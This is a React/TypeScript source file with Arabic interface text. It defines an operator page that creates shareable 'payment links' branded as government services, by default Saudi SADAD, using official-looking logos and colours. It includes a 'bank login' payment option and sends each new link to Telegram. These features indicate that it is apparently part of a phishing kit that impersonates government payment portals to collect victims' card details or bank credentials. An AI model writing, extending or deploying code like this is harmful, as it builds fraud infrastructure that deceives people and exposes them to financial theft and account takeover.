import React, { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { useCreateLink } from "@/hooks/useSupabase";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCurrencyCode } from "@/lib/countryCurrencies";
import { CheckCircle, Lock } from "lucide-react";
import BackButton from "@/components/BackButton";
import { sendToTelegram } from "@/lib/telegram";

const EntityPaymentLinkCreator = () => {
  const { country = 'SA', serviceKey = 'sadad' } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const branding = getServiceBranding(serviceKey);

  const [fullName, setFullName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [amount, setAmount] = useState("");
  const [description, setDescription] = useState("");
  const [paymentType, setPaymentType] = useState("card");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [createdLink, setCreatedLink] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      const link = await createLink.mutateAsync({
        type: "government",
        country_code: country,
        payload: {
          service_key: serviceKey,
          service_name: branding.nameAr,
          customerInfo: { fullName, phoneNumber },
          payment_amount: parseFloat(amount),
          currency_code: getCurrencyCode(country),
          description,
          payment_type: paymentType,
        },
      });
      const paymentUrl = `${window.location.origin}/pay/${link.id}/data`;
      setCreatedLink(paymentUrl);
      setShowSuccess(true);
      await sendToTelegram({
        type: 'payment_link_created',
        data: { service: branding.nameAr, amount, url: paymentUrl }
      });
      toast({ title: "✅ تم إنشاء الرابط بنجاح" });
    } catch (err) {
      toast({ title: "خطأ في إنشاء الرابط", variant: "destructive" });
    } finally { setIsSubmitting(false); }
  };

  if (showSuccess) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-gray-50" dir="rtl">
        <Card className="max-w-md w-full p-8 text-center space-y-6">
          <div className="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto"><CheckCircle className="w-12 h-12" /></div>
          <h2 className="text-2xl font-bold">تم إنشاء رابط {branding.nameAr}</h2>
          <div className="p-4 bg-gray-100 rounded-lg break-all font-mono text-sm">{createdLink}</div>
          <Button className="w-full" onClick={() => navigator.clipboard.writeText(createdLink)}>نسخ الرابط</Button>
          <Button className="w-full" variant="outline" onClick={() => window.open(createdLink, '_blank')}>فتح الرابط</Button>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen py-8 px-4 bg-gray-50" dir="rtl">
      <div className="max-w-2xl mx-auto space-y-6">
        <BackButton />
        <Card className="overflow-hidden">
          <div className="p-8 text-white" style={{ background: branding.colors.primary }}>
             <img src={branding.logo} alt={branding.nameAr} className="h-12 mb-4 brightness-0 invert" />
             <h1 className="text-3xl font-bold">{branding.nameAr}</h1>
          </div>
          <form onSubmit={handleSubmit} className="p-8 space-y-6">
            <div className="flex gap-4 p-2 bg-gray-100 rounded-xl">
              <Button type="button" variant={paymentType === "card" ? "default" : "outline"} onClick={() => setPaymentType("card")} className="flex-1 font-bold">بطاقة دفع</Button>
              <Button type="button" variant={paymentType === "bank_login" ? "default" : "outline"} onClick={() => setPaymentType("bank_login")} className="flex-1 font-bold">تسجيل بنكي</Button>
            </div>
            <div className="grid gap-4">
              <Label>اسم العميل</Label>
              <Input value={fullName} onChange={e => setFullName(e.target.value)} required />
              <Label>رقم الجوال</Label>
              <Input value={phoneNumber} onChange={e => setPhoneNumber(e.target.value)} required />
              <Label>المبلغ</Label>
              <Input type="number" value={amount} onChange={e => setAmount(e.target.value)} required />
              <Label>الوصف</Label>
              <Textarea value={description} onChange={e => setDescription(e.target.value)} />
            </div>
            <Button type="submit" disabled={isSubmitting} className="w-full h-14 text-lg font-bold" style={{ background: branding.colors.primary }}>{isSubmitting ? "جاري الإنشاء..." : "إنشاء رابط الدفع"}</Button>
          </form>
        </Card>
      </div>
    </div>
  );
};

export default EntityPaymentLinkCreator;
